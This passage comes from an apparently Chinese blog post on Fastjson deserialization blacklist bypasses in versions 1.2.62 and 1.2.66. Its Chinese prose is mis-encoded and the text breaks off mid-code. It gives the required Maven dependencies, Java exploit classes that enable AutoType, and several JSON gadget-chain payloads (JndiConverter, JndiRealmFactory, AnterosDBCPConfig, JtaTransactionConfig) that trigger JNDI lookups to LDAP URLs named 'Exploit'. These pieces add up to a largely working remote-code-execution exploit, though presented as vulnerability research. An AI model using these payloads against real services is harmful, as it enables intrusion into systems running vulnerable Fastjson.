class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;com.unboundid&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">4.0</span><span class="number">.9</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;commons-io&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;commons-io&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">2.5</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;com.alibaba&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;fastjson&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">1.2</span><span class="number">.66</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;org.aspectj&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;aspectjtools&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">1.9</span><span class="number">.5</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;com.esotericsoftware&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;kryo&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">4.0</span><span class="number">.0</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;com.sleepycat&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;je&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">5.0</span><span class="number">.73</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;shiro-core&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">1.12</span><span class="number">.0</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;br.com.anteros&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;Anteros-Core&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">1.3</span><span class="number">.6</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;br.com.anteros&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;Anteros-DBCP&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">1.0</span><span class="number">.1</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;com.ibatis&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;ibatis-sqlmap&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">1.3</span><span class="number">.1</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;javax.transaction&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;jta&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">1.1</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;org.apache.ignite&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;ignite-core&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">2.15</span><span class="number">.0</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;org.apache.ignite&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;ignite-jta&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">2.15</span><span class="number">.0</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;org.slf4j&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">2.0</span><span class="number">.7</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;org.apache.xbean&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;xbean-reflect&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">4.18</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;commons-codec&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;commons-codec&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">1.12</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;tomcat-dbcp&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">9.0</span><span class="number">.8</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;org.mybatis&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;mybatis&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">3.4</span><span class="number">.4</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>ËøôÂ∞±ÊòØÊï¥‰∏™fastjsonÂ§çÁé∞ÊâÄÈúÄÁöÑ‰æùËµñ‰∫Ü</p><h3 id="ÂâçÊèêÊù°‰ª∂"><a href="#ÂâçÊèêÊù°‰ª∂" class="headerlink" title="ÂâçÊèêÊù°‰ª∂"></a>ÂâçÊèêÊù°‰ª∂</h3><ul><li>ÈúÄË¶ÅÂºÄÂêØAutoTypeÔºõ</li><li>Fastjson &lt;&#x3D; 1.2.62Ôºõ</li><li>JNDIÊ≥®ÂÖ•Âà©Áî®ÊâÄÂèóÁöÑJDKÁâàÊú¨ÈôêÂà∂Ôºõ</li><li>ÁõÆÊ†áÊúçÂä°Á´ØÈúÄË¶ÅÂ≠òÂú®xbean-reflectÂåÖÔºõxbean-reflect ÂåÖÁöÑÁâàÊú¨‰∏çÈôêÔºåÊàëËøôÈáåÊää pom.xml Ë¥¥Âá∫Êù•„ÄÇ<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;com.alibaba&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;fastjson&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;<span class="number">1.2</span><span class="number">.62</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;  </span><br><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;org.apache.xbean&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;xbean-reflect&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;<span class="number">4.18</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;  </span><br><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;commons-collections&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></li></ul><h3 id="ÊºèÊ¥ûÂéüÁêÜ"><a href="#ÊºèÊ¥ûÂéüÁêÜ" class="headerlink" title="ÊºèÊ¥ûÂéüÁêÜ"></a>ÊºèÊ¥ûÂéüÁêÜ</h3><p>Ëøô‰∏™ÈìæÂ≠ê‰πüÊòØÈªëÂêçÂçïÁöÑÁªïËøáÔºåÊâÄ‰ª•Ë°•‰∏ÅÂ∞±‰∏çÁúã‰∫ÜÁõ¥Êé•ÁúãÊºèÊ¥ûÂéüÁêÜ<br>Ëøô‰∏™ÁâàÊú¨ÁªïËøáÈªëÊ∞ëÂçïÂà©Áî®ÁöÑÊòØ<code>org.apache.xbean.propertyeditor.JndiConverter</code> Á±ªÁöÑ <code>toObjectImpl()</code> ÂáΩÊï∞Â≠òÂú® JNDI Ê≥®ÂÖ•ÊºèÊ¥ûÔºåÂèØÁî±ÂÖ∂ÊûÑÈÄ†ÂáΩÊï∞Â§ÑËß¶ÂèëÂà©Áî®„ÄÇ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280019803.png" alt="image-20230828001845029"><br>‰ΩÜÊòØ<code>toObjectImpl</code>Âπ∂‰∏çÊòØgetterÊàñËÄÖsetterÊñπÊ≥ïÔºåÂÖ∂ÂÆûËøô‰∫õÈÉΩÂú®ÂÖ∂Áà∂Á±ªÂÆåÊàêÂú®ÊûÑÈÄ†ÂáΩÊï∞‰∏≠Ë∞ÉÁî®‰∫ÜÁà∂Á±ª<code>AbstractConverter</code>ÁöÑÊûÑÈÄ†ÂáΩÊï∞ÔºåËÄåÂú®Áà∂Á±ª‰∏≠ÁöÑ‰∏Ä‰∏™setterÊñπÊ≥ïÂç≥<code>setAsText</code>ÊñπÊ≥ï‰∏≠Ë∞ÉÁî®‰∫Ü<code>toObject</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280020103.png" alt="image-20230828002015008"><br>ÁªßÁª≠Áúã<code>toObject</code>ÊñπÊ≥ïÔºåÈáåÈù¢Ë∞ÉÁî®‰∫Ü<code>toObjectImpl</code>ÊñπÊ≥ï<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280020929.png" alt="image-20230828002027786"><br>ÁÑ∂ÂêéÁúãÁà∂Á±ªÁöÑ<code>toObjectImpl</code>ÊñπÊ≥ï<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280020442.png" alt="image-20230828002039348"><br>ÊòØ‰∏Ä‰∏™ÊäΩË±°ÊñπÊ≥ïÔºåÊÑèÂë≥ÁùÄÂè™ËÉΩÂú®ÂÖ∂Â≠êÁ±ª‰∏≠ÂÆûÁé∞ÔºåËøôÊ†∑Â∞±Ë∞ÉÂà∞‰∫Ü<code>org.apache.xbean.propertyeditor.JndiConverter</code> Á±ªÁöÑ <code>toObjectImpl()</code>ÊñπÊ≥ï<br>ÊâÄ‰ª•expÂ¶Ç‰∏ãÔºåserverÁ´ØËøòÊòØÁî®‰πãÂâçÁöÑ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bypass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.apache.xbean.propertyeditor.JndiConverter;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line"><span class="keyword">import</span> org.apache.xbean.propertyeditor.JndiConverter;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">bypass62</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.xbean.propertyeditor.JndiConverter\&quot;,\&quot;AsText\&quot;:\&quot;ldap://127.0.0.1:1099/ExportObject\&quot;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(poc);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280020794.png" alt="image-20230828002055319"></p><h3 id="Ë∞ÉËØïÂàÜÊûê"><a href="#Ë∞ÉËØïÂàÜÊûê" class="headerlink" title="Ë∞ÉËØïÂàÜÊûê"></a>Ë∞ÉËØïÂàÜÊûê</h3><p>‰∏ãÈù¢Ë∞ÉËØïÁúã‰∏Ä‰∏ãÔºåÁõ¥Êé•Âú®checkAutoTypeÂáΩÊï∞‰∏ãÊñ≠ÁÇπÊù•Âà∞ËøôÈáåÁúãÔºåÂú®Ëøô‰∏™ÁâàÊú¨‰∏≠ÂèàÂ§ö‰∫Ü‰∏Ä‰∫õ‰ª£Á†ÅÈÄªËæëËøôÈáåÂÄüÁî®‰∏Ä‰∏ãDrunkbaby‰Ω¨ÁöÑ‰ª£Á†ÅËß£ÈáäÂêß</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// ÈôêÂà∂‰∫ÜJSON‰∏≠@typeÊåáÂÆöÁöÑÁ±ªÂêçÈïøÂ∫¶</span></span><br><span class="line">      <span class="keyword">if</span> (typeName.length() &gt;= <span class="number">192</span> || typeName.length() &lt; <span class="number">3</span>) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// ÂçïÁã¨ÂØπexpectClassÂèÇÊï∞ËøõË°åÂà§Êñ≠ÔºåËÆæÁΩÆexpectClassFlagÁöÑÂÄº</span></span><br><span class="line"><span class="comment">// ÂΩì‰∏î‰ªÖÂΩìexpectClassÂèÇÊï∞‰∏ç‰∏∫Á©∫‰∏î‰∏ç‰∏∫Object„ÄÅSerializable„ÄÅ...Á≠âÁ±ªÁ±ªÂûãÊó∂expectClassFlagÊâç‰∏∫true</span></span><br><span class="line">      <span class="keyword">final</span> <span class="type">boolean</span> expectClassFlag;</span><br><span class="line">      <span class="keyword">if</span> (expectClass == <span class="literal">null</span>) &#123;</span><br><span class="line">          expectClassFlag = <span class="literal">false</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> (expectClass == Object.class</span><br><span class="line">                  || expectClass == Serializable.class</span><br><span class="line">                  || expectClass == Cloneable.class</span><br><span class="line">                  || expectClass == Closeable.class</span><br><span class="line">                  || expectClass == EventListener.class</span><br><span class="line">                  || expectClass == Iterable.class</span><br><span class="line">                  || expectClass == Collection.class</span><br><span class="line">                  ) &#123;</span><br><span class="line">              expectClassFlag = <span class="literal">false</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              expectClassFlag = <span class="literal">true</span>;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">      Class&lt;?&gt; clazz = <span class="literal">null</span>;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">final</span> <span class="type">long</span> <span class="variable">BASIC</span> <span class="operator">=</span> <span class="number">0xcbf29ce484222325L</span>;</span><br><span class="line">      <span class="keyword">final</span> <span class="type">long</span> <span class="variable">PRIME</span> <span class="operator">=</span> <span class="number">0x100000001b3L</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 1.2.43Ê£ÄÊµãÔºå&quot;[&quot;</span></span><br><span class="line">      <span class="keyword">final</span> <span class="type">long</span> <span class="variable">h1</span> <span class="operator">=</span> (BASIC ^ className.charAt(<span class="number">0</span>)) * PRIME;</span><br><span class="line">      <span class="keyword">if</span> (h1 == <span class="number">0xaf64164c86024f1aL</span>) &#123; <span class="comment">// [</span></span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 1.2.41Ê£ÄÊµãÔºå&quot;Lxx;&quot;</span></span><br><span class="line">      <span class="keyword">if</span> ((h1 ^ className.charAt(className.length() - <span class="number">1</span>)) * PRIME == <span class="number">0x9198507b5af98f0L</span>) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 1.2.42Ê£ÄÊµãÔºå&quot;LL&quot;</span></span><br><span class="line">      <span class="keyword">final</span> <span class="type">long</span> <span class="variable">h3</span> <span class="operator">=</span> (((((BASIC ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">              * PRIME)</span><br><span class="line">              ^ className.charAt(<span class="number">1</span>))</span><br><span class="line">              * PRIME)</span><br><span class="line">              ^ className.charAt(<span class="number">2</span>))</span><br><span class="line">              * PRIME;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// ÂØπÁ±ªÂêçËøõË°åHashËÆ°ÁÆóÂπ∂Êü•ÊâæËØ•ÂÄºÊòØÂê¶Âú®INTERNAL_WHITELIST_HASHCODESÂç≥ÂÜÖÈÉ®ÁôΩÂêçÂçï‰∏≠ÔºåËã•Âú®ÂàôinternalWhite‰∏∫true</span></span><br><span class="line">      <span class="type">boolean</span> <span class="variable">internalWhite</span> <span class="operator">=</span> Arrays.binarySearch(INTERNAL_WHITELIST_HASHCODES,</span><br><span class="line">              TypeUtils.fnv1a_64(className)</span><br><span class="line">      ) &gt;= <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéÊù•Âà∞‰∏ãÈù¢ËøôÈáå‰ºöËøõË°å‰∏Ä‰∏™ÈªëÁôΩÂêçÂçïÊ£ÄÊµãÔºåËøô‰∏™Á±ªÈÉΩ‰∏çÂú®ÊâÄ‰ª•ÁªßÁª≠ÂæÄ‰∏ã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280021877.png" alt="image-20230828002117567"><br>ÂæÄ‰∏ãÊù•Âà∞‰∫ÜËøôÈáåËøõË°åÁ±ªÂä†ËΩΩ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280021288.png" alt="image-20230828002142023"><br>Ë∑üËøõÂéªÂèëÁé∞Âú®‰∏ãÈù¢ËøôÈáåÊãøÂà∞‰∫ÜJndiConerterÁ±ªËøîÂõû‰∫ÜclazzÂÆåÊàê‰∫ÜÁ±ªÂä†ËΩΩ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280022741.png" alt="image-20230828002202507"><br>ÂêéÈù¢Â∞±ÊòØË∞ÉÁî®ÊûÑÈÄ†ÊñπÊ≥ïÁöÑËøáÁ®ã‰∫Ü‰∏çÁúã‰∫Ü<br>ËøôÈáåÊú™ÂºÄÂêØAutoType‰∏∫‰ªÄ‰πà‰∏çË°åÂèØ‰ª•ÂèÇËÄÉ‰∏ãÈù¢ÂçöÂÆ¢<br><a href="https://johnfrod.top/%e5%ae%89%e5%85%a8/704/">FastjsonÂèçÂ∫èÂàóÂåñÊºèÊ¥û(4)‚Äî1.2.68ÁâàÊú¨ ‚Äì JohnFrod‚Äôs Blog</a></p><h2 id="1-2-66ÊºèÊ¥ûÂàÜÊûê"><a href="#1-2-66ÊºèÊ¥ûÂàÜÊûê" class="headerlink" title="1.2.66ÊºèÊ¥ûÂàÜÊûê"></a>1.2.66ÊºèÊ¥ûÂàÜÊûê</h2><h3 id="ÂâçÊèêÊù°‰ª∂-1"><a href="#ÂâçÊèêÊù°‰ª∂-1" class="headerlink" title="ÂâçÊèêÊù°‰ª∂"></a>ÂâçÊèêÊù°‰ª∂</h3><ul><li>ÂºÄÂêØAutoTypeÔºõ</li><li>Fastjson &lt;&#x3D; 1.2.66Ôºõ</li><li>JNDIÊ≥®ÂÖ•Âà©Áî®ÊâÄÂèóÁöÑJDKÁâàÊú¨ÈôêÂà∂Ôºõ</li><li>org.apache.shiro.jndi.JndiObjectFactoryÁ±ªÈúÄË¶Åshiro-coreÂåÖÔºõ</li><li>br.com.anteros.dbcp.AnterosDBCPConfig Á±ªÈúÄË¶Å Anteros-CoreÂíå Anteros-DBCP ÂåÖÔºõ</li><li>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfigÁ±ªÈúÄË¶Åibatis-sqlmapÂíåjtaÂåÖÔºõ<br>ÂØºÂÖ•mavenÁöÑÂåÖÂèØ‰ª•Âú®<a href="https://mvnrepository.com/">Maven Repository: Search&#x2F;Browse&#x2F;Explore (mvnrepository.com)</a>Áõ¥Êé•Êâæ</li></ul><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>Êñ∞GadgetÁªïËøáÈªëÂêçÂçïÈôêÂà∂„ÄÇ</p><p>1.2.66Ê∂âÂèäÂ§öÊù°GadgetÈìæÔºåÂéüÁêÜÈÉΩÊòØÂ≠òÂú®JDNIÊ≥®ÂÖ•ÊºèÊ¥û„ÄÇ</p><p>org.apache.shiro.realm.jndi.JndiRealmFactoryÁ±ªPoCÔºö</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;</span>, <span class="string">&quot;jndiNames&quot;</span>:[<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>], <span class="string">&quot;Realms&quot;</span>:[<span class="string">&quot;&quot;</span>]&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280022723.png" alt="image-20230828002232239"><br>br.com.anteros.dbcp.AnterosDBCPConfigÁ±ªPoCÔºö</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span>,<span class="string">&quot;metricRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br><span class="line">Êàñ&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span>,<span class="string">&quot;healthCheckRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280022084.png" alt="image-20230828002244637"><br>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfigÁ±ªPoCÔºö</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;\<span class="string">&quot;@type\&quot;:\&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\&quot;,\&quot;properties\&quot;: &#123;\&quot;@type\&quot;:\&quot;java.util.Properties\&quot;,\&quot;UserTransaction\&quot;:\&quot;ldap://127.0.0.1:1099/Exploit\&quot;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>ËøôÊù°ÈìæÁöÑËøô‰∏™ÂåÖÊ≤°ÊâæÂà∞Ëøô‰∏™ÁâàÊú¨ÁöÑÂà©Áî®Â§±Ë¥•<br>ÂêÑÊù°ÈìæÁöÑexpÂ¶Ç‰∏ã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bypass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.jndi.JndiObjectFactory;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">bypass66</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">String</span> <span 